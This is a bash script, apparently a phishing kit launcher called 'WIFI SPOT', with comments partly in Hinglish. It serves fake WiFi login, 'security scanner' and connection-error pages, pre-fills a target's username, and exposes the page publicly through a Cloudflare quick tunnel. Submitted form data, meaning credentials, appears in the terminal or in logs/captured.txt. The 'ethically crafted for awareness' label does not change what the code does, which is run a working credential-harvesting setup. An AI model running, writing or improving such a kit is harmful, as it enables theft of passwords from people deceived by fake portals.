#!/bin/bash

# ==============================================================
#  📶 WIFI SPOT - EDUCATIONAL TOOL
#  🛡️  by HackSpot | Ethically Crafted for Awareness
# ==============================================================

# Colors
red='\033[1;31m'
green='\033[1;32m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
cyan='\033[1;36m'
white='\033[1;37m'
reset='\033[0m'
bold='\033[1m'

# Clear screen
clear

# ---------- BANNER ----------
echo -e "${cyan}${bold}"
echo "   ╔═══════════════════════════════════════════════════════════╗"
echo "   ║                                                           ║"
echo "   ║            ██╗    ██╗██╗███████╗██╗                      ║"
echo "   ║            ██║    ██║██║██╔════╝██║                      ║"
echo "   ║            ██║ █╗ ██║██║███████╗██║                      ║"
echo "   ║            ██║███╗██║██║╚════██║██║                      ║"
echo "   ║            ╚███╔███╔╝██║███████║██║                      ║"
echo "   ║             ╚══╝╚══╝ ╚═╝╚══════╝╚═╝                      ║"
echo "   ║                                                           ║"
echo "   ║            ███████╗██████╗  ██████╗ ████████╗            ║"
echo "   ║            ██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝            ║"
echo "   ║            ███████╗██████╔╝██║   ██║   ██║               ║"
echo "   ║            ╚════██║██╔═══╝ ██║   ██║   ██║               ║"
echo "   ║            ███████║██║     ╚██████╔╝   ██║               ║"
echo "   ║            ╚══════╝╚═╝      ╚═════╝    ╚═╝               ║"
echo "   ║                                                           ║"
echo "   ║   ╔═══════════════════════════════════════════════════╗   ║"
echo "   ║   ║          🛡️  by HackSpot  🛡️                   ║   ║"
echo "   ║   ║    Ethically Crafted for Educational Awareness    ║   ║"
echo "   ║   ╚═══════════════════════════════════════════════════╝   ║"
echo "   ║                                                           ║"
echo "   ╚═══════════════════════════════════════════════════════════╝"
echo -e "${reset}"

# ---------- USER INPUT ----------
echo ""
echo -e "${cyan}${bold}[•]${reset} ${white}Enter Username/Mobile to auto-fill:${reset} "
read username

echo ""
echo -e "${cyan}${bold}[•]${reset} ${white}Cloudflare Public Link use karna hai? (Y/N):${reset} "
read cf_choice

echo ""
echo -e "${green}${bold}┌──[ SELECT TEMPLATE ]${reset}"
echo -e "${green}│${reset}  ${green}1${reset}) ${green}Free Mall WiFi (Premium)${reset}"
echo -e "${green}│${reset}  ${yellow}2${reset}) ${yellow}Security Scanner (Urgent)${reset}"
echo -e "${green}│${reset}  ${red}3${reset}) ${red}Connection Error (Retry)${reset}"
echo -e "${green}└─────────────────────${reset}"
echo -n "Select option [1-3]: "
read template_choice

# Kill old processes
pkill -9 php 2>/dev/null
pkill -9 cloudflared 2>/dev/null

# Go to template
case $template_choice in
    1) cd templates/freewifi ;;
    2) cd templates/wifisec ;;
    3) cd templates/wifierror ;;
    *) echo -e "${red}Invalid!${reset}"; exit 1 ;;
esac

# ============================================================
# 🔥 USERNAME FIX: Yeh kisi bhi value="..." ko replace karega
# ============================================================
sed -i 's/value="[^"]*"/value="'"$username"'"/g' index.html

# ---------- START SERVER ----------
if [[ "$cf_choice" == "Y" || "$cf_choice" == "y" ]]; then
    # Cloudflare mode
    echo -e "${green}[+] Starting PHP Server (Background)...${reset}"
    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    sleep 2

    echo -e "${blue}[+] Starting Cloudflare Tunnel...${reset}"
    echo -e "${yellow}⏳ Generating public link...${reset}"
    echo -e "${red}─────────────────────────────────────${reset}"
    
    cloudflared tunnel --url http://localhost:8080 2>&1 | while read line; do
        if [[ $line == *"trycloudflare.com"* ]]; then
            url=$(echo "$line" | grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com')
            if [[ -n "$url" ]]; then
                echo ""
                echo -e "${green}✅ PUBLIC LINK GENERATED!${reset}"
                echo -e "${bold}🌐 Open in ANY device: ${cyan}${url}${reset}"
                echo -e "${yellow}📡 Form data yahan terminal par dikhega!${reset}"
                echo -e "${red}─────────────────────────────────────${reset}"
                echo -e "${red}⚠️ Press CTRL + C to stop${reset}"
            fi
        fi
    done &
    
    wait
else
    # Localhost mode (Cache-proof)
    TIMESTAMP=$(date +%s)
    echo -e "${green}[+] Starting PHP Server...${reset}"
    echo -e "${bold}🌐 Local URL: ${blue}http://127.0.0.1:8080/?t=${TIMESTAMP}${reset}"
    echo -e "${yellow}📂 Logs: logs/captured.txt${reset}"
    echo -e "${red}─────────────────────────────────────${reset}"
    echo -e "${red}⚠️ Press CTRL + C to stop${reset}"
    php -S 127.0.0.1:8080
fi
